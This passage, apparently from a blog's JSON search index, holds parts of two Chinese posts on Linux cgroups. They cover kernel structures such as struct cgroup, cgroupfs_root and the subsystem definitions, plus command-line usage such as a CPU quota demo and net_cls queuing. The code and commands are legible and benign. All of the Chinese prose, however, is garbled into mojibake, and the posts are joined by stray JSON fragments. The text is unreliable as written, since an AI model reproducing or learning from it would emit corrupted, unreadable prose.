å°±å¯ä»¥ç”¨å®é€šè¿‡cgroup_subsys_stateæ¥è·å–ç›¸åº”çš„ä¿¡æ¯ã€‚[^wangjiefeng] cgroup_subsys_state-&gt;cgroupç»“æ„å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475struct cgroup &#123;\tunsigned long flags; /* &quot;unsigned long&quot; so bitops work */\t/* * count users of this cgroup. &gt;0 means busy, but doesn&#x27;t * necessarily indicate the number of tasks in the cgroup */\tatomic_t count;\tint id; /* ida åˆ†é…çš„å±‚çº§å†…çš„ ID å· */\t/* sibling, children, parent åˆ©ç”¨å…„å¼Ÿå­©å­è¡¨ç¤ºæ³•å°†å±‚çº§çš„ cgroup æ„æˆä¸€é¢—æ ‘ã€‚ * We link our &#x27;sibling&#x27; struct into our parent&#x27;s &#x27;children&#x27;. * Our children link their &#x27;sibling&#x27; into our &#x27;children&#x27;. */ struct list_head sibling;\t/* my parent&#x27;s children */\tstruct list_head children;\t/* my children */\tstruct list_head files; /* my files */\tstruct cgroup *parent; /* my parent */\tstruct dentry *dentry; /* cgroup çš„ fs entry */\t/* * This is a copy of dentry-&gt;d_name, and it&#x27;s needed because * we can&#x27;t use dentry-&gt;d_name in cgroup_path(). * * You must acquire rcu_read_lock() to access cgrp-&gt;name, and * the only place that can change it is rename(), which is * protected by parent dir&#x27;s i_mutex. * * Normally you should use cgroup_name() wrapper rather than * access it directly. */\tstruct cgroup_name __rcu *name;\t/* subsys ä¸­æŒ‡é’ˆæŒ‡å‘æ¯ä¸€ä¸ªå·²æ³¨å†Œå­ç³»ç»Ÿçš„æŒ‡é’ˆï¼Œroot æŒ‡å‘æ‰€åœ¨å±‚çº§çš„ cgroup çš„ cgroup_root ç»“æ„ä½“ */\tstruct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT];\tstruct cgroupfs_root *root;\t/* * List of cg_cgroup_links pointing at css_sets with * tasks in this cgroup. Protected by css_set_lock */\tstruct list_head css_sets;\tstruct list_head allcg_node;\t/* cgroupfs_root-&gt;allcg_list */\tstruct list_head cft_q_node;\t/* used during cftype add/rm */\t/* * Linked list running through all cgroups that can * potentially be reaped by the release agent. Protected by * release_list_lock */\tstruct list_head release_list;\t/* * list of pidlists, up to two for each namespace (one for procs, one * for tasks); created on demand. */\tstruct list_head pidlists;\tstruct mutex pidlist_mutex;\t/* For RCU-protected deletion */\tstruct rcu_head rcu_head;\tstruct work_struct free_work;\t/* ç”¨æˆ·æ€æœŸæœ›æ”¶åˆ°çš„äº‹ä»¶åˆ—è¡¨ */\tstruct list_head event_list;\tspinlock_t event_list_lock;\t/* ç›®å½•çš„ xattrs */\tstruct simple_xattrs xattrs;&#125; cgroup-&gt;css_setsæ˜¯ä¸€ä¸ªå¤´æŒ‡é’ˆï¼ŒæŒ‡å‘ç”±cg_cgroup_link(åŒ…å« cgroup äº task ä¹‹é—´å¤šå¯¹å¤šå…³ç³»çš„ä¿¡æ¯) å½¢æˆçš„é“¾è¡¨ã€‚ç”±æ­¤æ¯ä¸€ä¸ªcg_cgroup_linkéƒ½åŒ…å«ä¸€ä¸ªæŒ‡å‘css_set *cgæŒ‡å‘æ¯ä¸€ä¸ªtaskçš„css_set.css_setç»“æ„ä¸­åˆ™åŒ…å«taskså¤´æŒ‡é’ˆã€‚æŒ‡å‘æ‰€æœ‰é“¾æ¥æ­¤css_setçš„ task è¿›ç¨‹æ„æˆçš„é“¾è¡¨ã€‚ cgroup-&gt;rootæ˜¯æŒ‡å‘cgroupfs_rootçš„æŒ‡é’ˆï¼Œè¿™å°±æ˜¯ cgroup æ‰€åœ¨å±‚çº§å¯¹åº”çš„ç»“æ„ä½“ã€‚ cgroupfs_rootç»“æ„å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940struct cgroupfs_root &#123;\tstruct super_block *sb;\t/* bitmask è®°å½•å°†è¦é™„åŠ åˆ°å±‚çº§çš„å­ç³»ç»Ÿ */\tunsigned long subsys_mask;\t/* å½“å‰å±‚çº§çš„ id å· (å”¯ä¸€) */\tint hierarchy_id;\t/* å½“å‰å·²ç»é™„åŠ åˆ°å±‚çº§çš„å­ç³»ç»Ÿæ©ç  */\tunsigned long actual_subsys_mask;\t/* A list running through the attached subsystems */\tstruct list_head subsys_list;\t/* æŒ‡å‘å½“å‰å±‚çº§çš„æ ¹ cgroup, ä¹Ÿå°±æ˜¯åˆ›å»ºå±‚çº§è‡ªåŠ¨åˆ›å»ºçš„ cgroup */\tstruct cgroup top_cgroup;\t/* è¿½è¸ªå½“å‰å±‚çº§å¯¹åº”çš„ cgroup æ•°é‡ */\tint number_of_cgroups;\t/* A list running through the active hierarchies */\tstruct list_head root_list;\t/* All cgroups on this root, cgroup_mutex protected */\tstruct list_head allcg_list;\t/* å±‚çº§è¯¦ç»†çš„ flags */\tunsigned long flags;\t/* IDs for cgroups in this hierarchy */\tstruct ida cgroup_ida;\t/* The path to use for release notifications. */\tchar release_agent_path[PATH_MAX];\t/* å±‚çº§çš„åå­— (ä¹Ÿè®¸æ˜¯ç©ºçš„) */\tchar name[MAX_CGROUP_ROOT_NAMELEN];&#125;; cgroupfs_root-&gt;sbæ˜¯æŒ‡å‘è¯¥å±‚çº§å…³è”çš„æ–‡ä»¶ç³»ç»Ÿçš„è¶…çº§å—ã€‚ä¹‹æ‰€ä»¥cgroupä¸css_setä¹‹é—´å¤šäº†ä¸€ä¸ªcgroup_stateç»“æ„ä½“ï¼Œæ˜¯å› ä¸ºcgroupäºcss_setæ˜¯ä¸€ä¸ªå¤šå¯¹å¤šçš„å…³ç³»éœ€è¦ä¸€ä¸ªä¸­é—´ç»“æ„å°†ä»–ä»¬è”ç³»èµ·æ¥ï¼Œ 0x02 cgroup filesystemcgroups æ˜¯ç”¨æˆ·æ€æ¥å£æ˜¯ç”¨æ–‡ä»¶ç³»ç»Ÿå®ç°çš„ï¼Œåœ¨ linux ä¸Šå®ç°æ–‡ä»¶ç³»ç»Ÿå¿…ç„¶è¦çŸ¥é“ä¸€äº›VFSç›¸å…³çš„çŸ¥è¯†ã€‚ è¶…çº§å—å¯¹è±¡ (superblock object): å­˜æ”¾å·²å®‰è£…æ–‡ä»¶ç³»ç»Ÿç›¸å…³ä¿¡æ¯ã€‚ ç´¢å¼•èŠ‚ç‚¹å¯¹è±¡ (inode object): å­˜æ”¾å…³äºæ–‡ä»¶çš„ä¸€èˆ¬ä¿¡æ¯ã€‚ æ–‡ä»¶å¯¹è±¡ (file object): å­˜æ”¾æ‰“å¼€æ–‡ä»¶ä¸è¿›ç¨‹ç›´æ¥çš„ä¿¡æ¯ã€‚ ç›®å½•é¡¹å¯¹è±¡ (dentry object): å­˜æ”¾ç›®å½•é¡¹ä¸å¯¹åº”æ–‡ä»¶è¿›è¡Œé“¾æ¥çš„æœ‰å…³ä¿¡æ¯ã€‚ cgroup æ–‡ä»¶ç³»ç»Ÿçš„å®šä¹‰ï¼š 12345static struct file_system_type cgroup_fs_type = &#123;\t.name = &quot;cgroup&quot;,\t.mount = cgroup_mount, // mount\t.kill_sb = cgroup_kill_sb, // umount&#125;; è¶…çº§å—å®šä¹‰ï¼š 123456static const struct super_operations cgroup_ops = &#123;\t.statfs = simple_statfs,\t.drop_inode = generic_delete_inode,\t.show_options = cgroup_show_options,\t.remount_fs = cgroup_remount,&#125;; æ–‡ä»¶æ“ä½œå®šä¹‰ï¼š 1234567static const struct file_operations cgroup_file_operations = &#123;\t.read = cgroup_file_read,\t.write = cgroup_file_write,\t.llseek = generic_file_llseek,\t.open = cgroup_file_open,\t.release = cgroup_file_release,&#125;; ç´¢å¼•å—å®šä¹‰ï¼š 12345678910static const struct inode_operations cgroup_dir_inode_operations = &#123;\t.lookup = cgroup_lookup,\t.mkdir = cgroup_mkdir,\t.rmdir = cgroup_rmdir,\t.rename = cgroup_rename,\t.setxattr = cgroup_setxattr,\t.getxattr = cgroup_getxattr,\t.listxattr = cgroup_listxattr,\t.removexattr = cgroup_removexattr,&#125;; 0x10 subsystemså­ç³»ç»Ÿå¯¹åº”çš„å®ç°åœ¨cgroup_subsysç»“æ„ä½“ä¸­ï¼Œå…¶å®ç°ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344struct cgroup_subsys &#123;\tstruct cgroup_subsys_state *(*css_alloc)(struct cgroup *cgrp);\tint (*css_online)(struct cgroup *cgrp);\tvoid (*css_offline)(struct cgroup *cgrp);\tvoid (*css_free)(struct cgroup *cgrp);\tint (*can_attach)(struct cgroup *cgrp, struct cgroup_taskset *tset);\tvoid (*cancel_attach)(struct cgroup *cgrp, struct cgroup_taskset *tset);\tvoid (*attach)(struct cgroup *cgrp, struct cgroup_taskset *tset);\tvoid (*fork)(struct task_struct *task);\tvoid (*exit)(struct cgroup *cgrp, struct cgroup *old_cgrp, struct task_struct *task);\tvoid (*bind)(struct cgroup *root);\tint subsys_id;\tint disabled;\tint early_init;\t/* ... */\tbool use_id;\t/* ... */\tbool broken_hierarchy;\tbool warned_broken_hierarchy;#define MAX_CGROUP_TYPE_NAMELEN 32\tconst char *name;\t/* Link to parent, and list entry in parent&#x27;s children. Protected by cgroup_lock() */\tstruct cgroupfs_root *root;\tstruct list_head sibling; /* used when use_id == true */\tstruct idr idr;\tspinlock_t id_lock;\t/* list of cftype_sets */\tstruct list_head cftsets;\t/* base cftypes, automatically [de]registered with subsys itself */\tstruct cftype *base_cftypes;\tstruct cftype_set base_cftset;\t/* should be defined only by modular subsystems */\tstruct module *module;&#125;; ç»“æ„ä½“æ˜¯å„å­ç³»ç»Ÿçš„æŠ½è±¡ï¼Œå…¶ä¸­åŒ…å«å„å­ç³»ç»Ÿæ“ä½œçš„äº¤é›†ã€‚åœ¨å®è·µå…·ä½“å­ç³»ç»Ÿæ—¶å€™å¡«å……æŠ½è±¡ä¸­å®šä¹‰ä¸”éœ€è¦çš„éƒ¨åˆ† (é¢å‘å¯¹è±¡çš„ C åœ¨ kernel ä¸­å¤§é‡ä½¿ç”¨). 0x14 blkio subsystemblkio subsystem æ˜¯åŸºäºCFQå®ç°çš„ã€‚ 12345678910struct cgroup_subsyssu blkio_subsys = &#123;\t.name = &quot;blkio&quot;,\t.css_alloc = blkcg_css_alloc,\t.css_offline = blkcg_css_offline,\t.css_free = blkcg_css_free,\t.can_attach = blkcg_can_attach,\t.subsys_id = blkio_subsys_id,\t.base_cftypes = blkcg_files,\t.module = THIS_MODULE,&#125;; 0x11 cpu subsystemå½“è¿è¡Œ SCHED_NORMALï¼ŒSCHED_BATCH cpu subsystem æ˜¯åŸºäºCFSå®ç°çš„ï¼Œç„¶å dl_sched_class è°ƒåº¦ç±»ä¹Ÿæ˜¯å®ç° fair_group_scheduling ä½†æ˜¯ä¸¤è€…ä¹‹é—´å·®åˆ«ç›®å‰è¿˜æ²¡æœ‰æ·±ç©¶ã€‚ 12345678910111213struct cgroup_subsys cpu_cgroup_subsys = &#123;\t.name = &quot;cpu&quot;,\t.css_alloc\t= cpu_cgroup_css_alloc,\t.css_free\t= cpu_cgroup_css_free,\t.css_online\t= cpu_cgroup_css_online,\t.css_offline\t= cpu_cgroup_css_offline,\t.can_attach\t= cpu_cgroup_can_attach,\t.attach = cpu_cgroup_attach,\t.exit = cpu_cgroup_exit,\t.subsys_id\t= cpu_cgroup_subsys_id,\t.base_cftypes\t= cpu_files,\t.early_init\t= 1,&#125;; 0x12 cpuset subsystem12345678910111213struct cgroup_subsys cpuset_subsys = &#123;\t.name = &quot;cpuset&quot;,\t.css_alloc = cpuset_css_alloc,\t.css_online = cpuset_css_online,\t.css_offline = cpuset_css_offline,\t.css_free = cpuset_css_free,\t.can_attach = cpuset_can_attach,\t.cancel_attach = cpuset_cancel_attach,\t.attach = cpuset_attach,\t.subsys_id = cpuset_subsys_id,\t.base_cftypes = files,\t.early_init = 1,&#125; 0x13 memory subsystem123456789101112131415struct cgroup_subsys mem_cgroup_subsys = &#123;\t.name = &quot;memory&quot;,\t.subsys_id = mem_cgroup_subsys_id,\t.css_alloc = mem_cgroup_css_alloc,\t.css_online = mem_cgroup_css_online,\t.css_offline = mem_cgroup_css_offline,\t.css_free = mem_cgroup_css_free,\t.can_attach = mem_cgroup_can_attach,\t.cancel_attach = mem_cgroup_cancel_attach,\t.attach = mem_cgroup_move_task,\t.bind = mem_cgroup_bind,\t.base_cftypes = mem_cgroup_files,\t.early_init = 0,\t.use_id = 1,&#125;; 0x15 freezer subsystem123456789101112struct cgroup_subsys freezer_subsys = &#123;\t.name = &quot;freezer&quot;,\t.css_alloc\t= freezer_css_alloc,\t.css_online\t= freezer_css_online,\t.css_offline\t= freezer_css_offline,\t.css_free\t= freezer_css_free,\t.subsys_id\t= freezer_subsys_id,\t.attach = freezer_attach,\t.fork = freezer_fork,\t.base_cftypes\t= files,&#125;; 0x16 drvices subsystem12345678910struct cgroup_subsys devices_subsys = &#123;\t.name = &quot;devices&quot;,\t.can_attach = devcgroup_can_attach,\t.css_alloc = devcgroup_css_alloc,\t.css_free = devcgroup_css_free,\t.css_online = devcgroup_online,\t.css_offline = devcgroup_offline,\t.subsys_id = devices_subsys_id,\t.base_cftypes = dev_cgroup_files,&#125; [^wangjiefeng]: ç‹å–†é”‹ Linux Cgroups è¯¦è§£[^source]: Cgroups æºç åˆ†æ 1: åŸºæœ¬æ¦‚å¿µä¸æ¡†æ¶[^lwn]: LWN Writeback and control groups[^idr]: idr - integer ID management[^netlec]: netlec","tags":["linux"]},{"title":"cgroups I - usage","path":"/2016/07/25/cgroup-i/","content":"0x00 what is cgroup?cgroups æ˜¯ Linux å†…æ ¸çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œç”¨æ¥é™åˆ¶ï¼Œæ§åˆ¶ä¸åˆ†ç¦»ä¸€ä¸ªè¿›ç¨‹ç»„ç¾¤çš„èµ„æºï¼ˆå¦‚ CPU, å†…å­˜ï¼Œç½‘ç»œï¼Œç£ç›˜è¾“å…¥è¾“å‡ºç­‰). 0x01 The begin of cgroupsè¿™ä¸ªé¡¹ç›®æœ€æ—©æ˜¯ç”± Google çš„å·¥ç¨‹å¸ˆåœ¨ 2006 å¹´å‘èµ· (ä¸»è¦æ˜¯ Paul Menage å’Œ Rohit Seth), æœ€æ—©çš„åç§°ä¸ºè¿›ç¨‹å®¹å™¨ (process containers). åœ¨ 2007 å¹´æ—¶ï¼Œå› ä¸ºåœ¨ Linux å†…æ ¸ä¸­ï¼Œå®¹å™¨ (container) è¿™ä¸ªåè¯æœ‰è®¸å¤šä¸åŒçš„æ„ä¹‰ï¼Œä¸ºé¿å…æ··ä¹±ï¼Œè¢«é‡å‘½åä¸º cgroup, å¹¶ä¸”è¢«åˆå¹¶åˆ° 2.6.24 ç‰ˆçš„å†…æ ¸ä¸­å» [^wiki]. 0x02 featurecgroup çš„ä¸€ä¸ªè®¾è®¡ç›®æ ‡æ˜¯ä¸ºä¸åŒçš„åº”ç”¨æƒ…å†µæä¾›ç»Ÿä¸€çš„æ¥å£ï¼Œä»æ§åˆ¶å•ä¸€è¿›ç¨‹ (åƒ nice) åˆ°æ“ä½œç³»ç»Ÿå±‚è™šæ‹ŸåŒ– (åƒ opeNVZ,Linux-VServer,LXC).cgroups æä¾› [^access]ï¼š èµ„æºé™åˆ¶ï¼šç»„å¯ä»¥è¢«è®¾ç½®ä¸è¶…è¿‡è®¾å®šçš„å†…å­˜é™åˆ¶ï¼›è¿™ä¹ŸåŒ…æ‹¬è™šæ‹Ÿå†…å­˜ã€‚ ä¼˜å…ˆåŒ–ï¼šä¸€äº›ç»„å¯èƒ½ä¼šå¾—åˆ°å¤§é‡çš„ CPU[5] æˆ–ç£ç›˜è¾“å…¥è¾“å‡ºé€šé‡ã€‚ æŠ¥å‘Šï¼šç”¨æ¥è¡¡é‡ç³»ç»Ÿç¡®å®æŠŠå¤šå°‘èµ„æºç”¨åˆ°é€‚åˆçš„ç›®çš„ä¸Šã€‚ åˆ†ç¦»ï¼šä¸ºç»„åˆ†ç¦»å‘½åç©ºé—´ï¼Œè¿™æ ·ä¸€ä¸ªç»„ä¸ä¼šçœ‹åˆ°å¦ä¸€ä¸ªç»„çš„è¿›ç¨‹ã€ç½‘ç»œè¿æ¥å’Œæ–‡ä»¶ã€‚ æ§åˆ¶ï¼šå†»ç»“ç»„æˆ–æ£€æŸ¥ç‚¹å’Œé‡å¯åŠ¨ã€‚ 0x03 the position of cgroups in kernelå¯ä»¥åœ¨ä¸‹å›¾çœ‹åˆ°å…¶æ‰€åœ¨ï¼š architectures 0x10 The struct of cgroups0x11 term *ä»»åŠ¡ (Tasks)*ï¼šå°±æ˜¯ç³»ç»Ÿçš„ä¸€ä¸ªè¿›ç¨‹ã€‚ *æ§åˆ¶ç»„ (Control Group)*ï¼šä¸€ç»„æŒ‰ç…§æŸç§æ ‡å‡†åˆ’åˆ†çš„è¿›ç¨‹ï¼Œæ¯”å¦‚å®˜æ–¹æ–‡æ¡£ä¸­çš„ Professor å’Œ Student, æˆ–æ˜¯ WWW å’Œ System ä¹‹ç±»çš„ï¼Œå…¶è¡¨ç¤ºäº†æŸè¿›ç¨‹ç»„.Cgroups ä¸­çš„èµ„æºæ§åˆ¶éƒ½æ˜¯ä»¥æ§åˆ¶ç»„ä¸ºå•ä½å®ç°ã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥åŠ å…¥åˆ°æŸä¸ªæ§åˆ¶ç»„ã€‚è€Œèµ„æºçš„é™åˆ¶æ˜¯å®šä¹‰åœ¨è¿™ä¸ªç»„ä¸Šã€‚ç®€å•ç‚¹è¯´ï¼Œcgroup çš„å‘ˆç°å°±æ˜¯ä¸€ä¸ªç›®å½•å¸¦ä¸€ç³»åˆ—çš„å¯é…ç½®æ–‡ä»¶ã€‚ *å±‚çº§ (Hierarchy)*ï¼šæ§åˆ¶ç»„å¯ä»¥ç»„ç»‡æˆ hierarchical çš„å½¢å¼ï¼Œæ—¢ä¸€é¢—æ§åˆ¶ç»„çš„æ ‘ (ç›®å½•ç»“æ„). æ§åˆ¶ç»„æ ‘ä¸Šçš„å­èŠ‚ç‚¹ç»§æ‰¿çˆ¶ç»“ç‚¹çš„å±æ€§ã€‚ç®€å•ç‚¹è¯´ï¼Œhierarchy å°±æ˜¯åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªå­ç³»ç»Ÿä¸Šçš„ cgroups ç›®å½•æ ‘ã€‚ *å­ç³»ç»Ÿ (Subsystem)*ï¼šä¸€ä¸ªå­ç³»ç»Ÿå°±æ˜¯ä¸€ä¸ªèµ„æºæ§åˆ¶å™¨ï¼Œæ¯”å¦‚ CPU å­ç³»ç»Ÿå°±æ˜¯æ§åˆ¶ CPU æ—¶é—´åˆ†é…çš„ä¸€ä¸ªæ§åˆ¶å™¨ã€‚å­ç³»ç»Ÿå¿…é¡»é™„åŠ åˆ°ä¸€ä¸ªå±‚çº§ä¸Šæ‰èƒ½èµ·ä½œç”¨ï¼Œä¸€ä¸ªå­ç³»ç»Ÿé™„åŠ åˆ°æŸä¸ªå±‚çº§ä»¥åï¼Œè¿™ä¸ªå±‚çº§ä¸Šçš„æ‰€æœ‰æ§åˆ¶æ—ç¾¤éƒ½å—åˆ°è¿™ä¸ªå­ç³»ç»Ÿçš„æ§åˆ¶.Cgroup çš„å­ç³»ç»Ÿå¯ä»¥æœ‰å¾ˆå¤šï¼Œä¹Ÿåœ¨ä¸æ–­å¢åŠ ä¸­ã€‚ 0x12 resource mangementå¼•ç”¨è¿™ä¸ªå›¾ç‰‡ï¼Œå°è¯•è§£é‡Šä¸€ä¸‹ cgroup çš„èµ„æºåˆ’åˆ†çš„ç»“æ„ã€‚ä¸åŒé¢œè‰²ä»£è¡¨ä¸åŒgroupå¯¹èµ„æºçš„åˆ’åˆ†ï¼Œä¸è¿‡è¿™ä¸ªè®¾è®¡å­˜åœ¨ä¸€äº›ç¼ºé™·å·²ç»é­åˆ°Tejun Heoçš„ åæ§½, æŸä¸ªä»»åŠ¡å½’ç±»æ–¹å¼çš„å¤šæ ·æ€§å¯¼è‡´äº†å¤šä¸ªHierarchyçš„æ­£äº¤ï¼Œå¯¼è‡´äº†è¿›ç¨‹ç®¡ç†çš„å¤æ‚ã€‚å¤šä¸ªå­ç³»ç»Ÿçš„ä¹‹é—´çš„äº¤å‰ä½¿ç”¨å¯¼è‡´äº†ç®¡ç†çš„å¤æ‚ï¼Œä¸è¿‡åœ¨ä¸€äº› cgroup å¥—ä»¶é‡Œé¢ä½¿ç”¨é…ç½®æ–‡ä»¶è½¬ç§»ä¸€éƒ¨è¿™ä¸ªé—®é¢˜çš„å¤æ‚åº¦ã€‚ cgroups2 0x13 subsystem blkio â€” è¿™ä¸ªå­ç³»ç»Ÿä¸ºå—è®¾å¤‡è®¾å®šè¾“å…¥ &#x2F; è¾“å‡ºé™åˆ¶ï¼Œæ¯”å¦‚ç‰©ç†è®¾å¤‡ï¼ˆç£ç›˜ï¼Œå›ºæ€ç¡¬ç›˜ï¼ŒUSB ç­‰ç­‰ï¼‰. cpu â€” è¿™ä¸ªå­ç³»ç»Ÿä½¿ç”¨è°ƒåº¦ç¨‹åºæä¾›å¯¹ CPU çš„ cgroup ä»»åŠ¡è®¿é—®ã€‚ cpuacct â€” è¿™ä¸ªå­ç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆ cgroup ä¸­ä»»åŠ¡æ‰€ä½¿ç”¨çš„ CPU æŠ¥å‘Šã€‚ cpuset â€” è¿™ä¸ªå­ç³»ç»Ÿä¸º cgroup ä¸­çš„ä»»åŠ¡åˆ†é…ç‹¬ç«‹ CPUï¼ˆåœ¨å¤šæ ¸ç³»ç»Ÿï¼‰å’Œå†…å­˜èŠ‚ç‚¹ã€‚ devices â€” è¿™ä¸ªå­ç³»ç»Ÿå¯å…è®¸æˆ–è€…æ‹’ç» cgroup ä¸­çš„ä»»åŠ¡è®¿é—®è®¾å¤‡ã€‚ freezer â€” è¿™ä¸ªå­ç³»ç»ŸæŒ‚èµ·æˆ–è€…æ¢å¤ cgroup ä¸­çš„ä»»åŠ¡ã€‚ memory â€” è¿™ä¸ªå­ç³»ç»Ÿè®¾å®š cgroup ä¸­ä»»åŠ¡ä½¿ç”¨çš„å†…å­˜é™åˆ¶ï¼Œå¹¶è‡ªåŠ¨ç”Ÿæˆâ€‹â€‹å†…å­˜èµ„æºä½¿ç”¨æŠ¥å‘Šã€‚ net_cls â€” è¿™ä¸ªå­ç³»ç»Ÿä½¿ç”¨ç­‰çº§è¯†åˆ«ç¬¦ï¼ˆclassidï¼‰æ ‡è®°ç½‘ç»œæ•°æ®åŒ…ï¼Œå¯å…è®¸ Linux æµé‡æ§åˆ¶ç¨‹åºï¼ˆtcï¼‰è¯†åˆ«ä»å…·ä½“ cgroup ä¸­ç”Ÿæˆçš„æ•°æ®åŒ…ã€‚ net_prio â€” è¿™ä¸ªå­ç³»ç»Ÿç”¨æ¥è®¾è®¡ç½‘ç»œæµé‡çš„ä¼˜å…ˆçº§ hugetlb â€” è¿™ä¸ªå­ç³»ç»Ÿä¸»è¦é’ˆå¯¹äº HugeTLB ç³»ç»Ÿè¿›è¡Œé™åˆ¶ï¼Œè¿™æ˜¯ä¸€ä¸ªå¤§é¡µæ–‡ä»¶ç³»ç»Ÿã€‚ 0x20 Base usage in CLI0x21 ç¡®è®¤ç³»ç»Ÿåœ¨ä½¿ç”¨systemdçš„ç³»ç»Ÿé‡Œé¢hierarchyç”±å…¶å¯åŠ¨æ—¶è‡ªåŠ¨åˆ›å»ºï¼Œåœ¨rhel6ç³»åˆ—ä¸­éœ€è¦yum install libcgroup, å¦‚æœæ˜¯Ubuntuç³»åˆ—çš„è¯è¾ƒæ–°çš„ç‰ˆæœ¬æ˜¯è‡ªå¸¦äº†ã€‚æŸ¥çœ‹ cgroup æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ï¼š 1234567891011# mount -t cgroupcgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpuacct,cpu)cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)cgroup on /sys/fs/cgroup/net_cls type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls) æŸ¥çœ‹å­ç³»ç»Ÿï¼š 12345678910# lssubsyscpusetcpu,cpuacctmemorydevicesfreezernet_clsblkioperf_eventhugetlb 0x22 ä½¿ç”¨æ¡ˆä¾‹ 1Linux ä¸­æŠŠcgroupså®ç°æˆäº†æ–‡ä»¶ç³»ç»Ÿï¼Œæ‰€ä»¥å¯¹æ–‡ä»¶ç³»ç»Ÿé‡Œé¢çš„ç‰¹å®šæ–‡ä»¶è¿›è¡Œæ“ä½œå°±å¯ä»¥å®Œæˆå¯¹cgroupçš„é…ç½®ã€‚ demo[^coolshell]: 123456int main(void)&#123; int i = 0; for(;;) i++; return 0;&#125; é…ç½®ï¼šé¦–å…ˆåœ¨æŸä¸ªå­ç³»ç»Ÿä¸‹é¢å»ºç«‹ä¸€ä¸ªç›®å½•ï¼Œå…¶ç›®å½•é‡Œé¢ä¼šè‡ªåŠ¨åˆ›å»ºä¸å…¶ç›¸å…³çš„æ–‡ä»¶ (æ–‡ä»¶åè¡¨ç¤ºå…¶æ„ä¹‰); å…¶æ¬¡ç½®å…·ä½“å‚æ•°åˆ°æ–‡ä»¶å; ç„¶åæŠŠè¦é™åˆ¶çš„è¿›ç¨‹ PID æ”¾å…¥taskçš„æ–‡ä»¶ã€‚ 12345# mkdir /sys/fs/cgroup/cpu/eleme# ps uax | grep deadloop root 4260 59.0 0.0 4164 352 pts/0 RN 23:12 3:03 ./deadloop# echo &quot;2000&quot; &gt;&gt; /sys/fs/cgroup/cpu/eleme/cpu.cfs_quota_us# echo &quot;4260&quot; &gt;&gt; /sys/fs/cgroup/cpu/eleme/tasks é…ç½®å‰ï¼š PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 4434 root 25 5 4164 356 280 R 92.0 0.0 0:04.18 deadloop é…ç½®åï¼š PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 4434 root 25 5 4164 356 280 R 2.0 0.0 1:14.91 deadloop 0x23 ä½¿ç”¨æ¡ˆä¾‹ 2ä¹‹æ‰€ä»¥å•ç‹¬è®°å½•äº† netcls çš„ä½¿ç”¨ï¼Œæ˜¯å› ä¸ºnetclsç›¸å½“äºcgroupä¸­å…¶ä»–çš„æ§åˆ¶ç»„ä½¿ç”¨èµ·æ¥ä¸æ˜¯å¾ˆæ–¹ä¾¿ (éœ€è¦å¤–éƒ¨å·¥å…·é…åˆ). åœ¨ cgroup ä¸­ï¼Œé€šè¿‡ netcls å­ç³»ç»Ÿä½¿ç”¨è¯†åˆ«ç¬¦ (classid) æ ‡è®°ç½‘ç»œæ•°æ®åŒ…ï¼Œæ ‡è®°å®Œæˆè¿‡åä¸€èˆ¬æ˜¯ä»¥ä¸‹ä¸¤ä¸ªæ“ä½œã€‚ å¯ç”¨æµé‡æ§åˆ¶å™¨ (tc) ä»ä¸åŒçš„cgroupä¸­å…³è”ä¸åŒçš„ä¼˜å…ˆçº§åˆ°æ•°æ®åŒ…ï¼Œè¿™ä¸ªåœºæ™¯å¤šæ•°æ˜¯ç”¨äºQOSç›¸å…³ã€‚ ä¹Ÿå¯ä»¥ç”¨iptablesæ¥å¯¹è¿™äº›å…·æœ‰è¿™äº›ç‰¹å¾ (-m cgroup) æµé‡åšä¸€äº›å…·ä½“çš„æ“ä½œï¼Œè¿™ä¸ªæ“ä½œå¹…åº¦æ¯”QOSçš„è¦å¤§ï¼Œæ ¹æ®iptablesçš„ä¸åŒtableæä¾›çš„-Jæœ‰å¾ˆå¤šåŠ¨ä½œå¯ä»¥åšã€‚ Basic Queuing technology åœ¨æè¿°Linux QOSä¹‹å‰éœ€è¦æƒ³è±¡æœ€åŸºæœ¬çš„é˜Ÿåˆ—æŠ€æœ¯ - æ™®é€šé˜Ÿåˆ— (FIFO), è€Œåå¯¹å…¶æœ‰äº†ç‚¹æ”¹è¿›è¯ç”Ÿäº†ç”± 3 ä¸ªé˜Ÿåˆ—ä¸€èµ·å·¥ä½œ (pfifo), ç”±å¤šä¸ªé˜Ÿåˆ—ä¸€èµ·å·¥ä½œçš„ (Stochastic Fair Queuing) å’Œæ‹¿ç€ä»¤ç‰Œæ‰èƒ½èµ°åŒ…çš„ (token bucket filter)[^qdisc].éœ€è¦è¡¥å……è¯´æ˜çš„æ˜¯è™½ç„¶ linux ä¹Ÿæ”¯æŒåŸºäºå­—èŠ‚çš„é˜Ÿåˆ—æŠ€æœ¯bfifo, ä½†æ˜¯bfifoåœ¨ç‰¹æ€§æ”¯æŒä¸Šè¦è¿œé€Šè‰²äºpfifo. pfifo æ¥å£é»˜è®¤é˜Ÿåˆ—æŠ€æœ¯çš„ pfifo_fast pfifo(åŸºäº packet çš„ fifo) 